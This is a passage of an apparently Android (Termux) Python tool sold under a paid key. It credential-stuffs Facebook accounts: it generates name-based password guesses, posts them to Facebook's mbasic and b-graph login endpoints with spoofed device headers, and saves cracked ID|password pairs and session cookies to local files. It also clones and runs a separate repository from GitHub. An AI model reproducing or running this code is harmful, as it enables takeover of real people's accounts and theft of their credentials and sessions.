                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com',
                        'method': 'GET',
                        'path':'/',
                        'scheme': 'https',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
                        "User-Agent": ua,}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Tonmoy=session.cookies.get_dict().keys()
                        if "c_user" in Tonmoy:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas));dek("\033[1;37m [\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;92m"+kuki+"")
                                open('/sdcard/TONMOY-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/TONMOY-FILE-COKI','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Tonmoy:
                                if 'y' in pcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                        open('/sdcard/TONMOY-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mTONMOY-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "[FBAN/FB4A;FBAV/74.0.0.2457;FBBV/2447900;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/H2O;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I337;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                                head = {'User-Agent': ua_string,
                                        'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                        open('/sdcard/TONMOY-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                dek(f'\r\r\033[1;35m [\033[1;37mTONMOY-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                                open('/sdcard/TONMOY-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/TONMOY-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass



#====================RANDOM===============
def filem():
    os.system('cd && rm -rf Dump ;git clone --depth=1 https://github.com/AKING110/Dump.git')
    os.system('cd && cd Dump ;git pull ;python AKING.py')
#====================DUMP===============



logo1 = (f"""\x1b[1;97m
88888888888 888    d8P  888b     d888 
    888     888   d8P   8888b   d8888 
    888     888  d8P    88888b.d88888 
    888     888d88K     888Y88888P888 
    888     8888888b    888 Y888P 888 
    888     888  Y88b   888  Y8P  888 
    888     888   Y88b  888   "   888 
    888     888    Y88b 888       888
\t   \033[31;42mTONMOY MAHATO\33[0;m\__😘😈
\x1b[1;97m{40*"="} 
  [\x1b[1;96m+\x1b[1;97m] AUTHOR : Tonmoy Mahato
  [\x1b[1;96m+\x1b[1;97m] GITHUB : tonmoy404-cyber        
  [\x1b[1;96m+\x1b[1;97m] FACEBOOK : Tonmoy X X X 
  [\x1b[1;96m+\x1b[1;97m] YOU TUBE : Tonmoy Mahato                       
  [\x1b[1;96m+\x1b[1;97m] TOOLS : \x1b[1;92mPremium\x1b[1;97m
{40*"="}\x1b[1;97m""")
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.tonmoy-cov', 'r').read()
	r1=requests.get("https://approvalx.blogspot.com/2023/02/approvaltxt.html").text
	if key1 in r1:
		os.system('clear')
		dek(logo1)
		Main()
	else:
		os.system("clear")
		dek(logo1)
		dek("\t  15 Day 100 taka")
		dek("\t  30 Day 200 taka")
		tln()
		dek ("  Your Key : \x1b[1;92m"+ak+ahsan+key1,"\x1b[1;97m")
		tln()
		input("  Press Enter To Send Key")
		time.sleep(1.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20''%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
		os.system('am start https://wa.me/+8801766804626?text=' + tks)
		Subscraption()        


#============================================
Main()
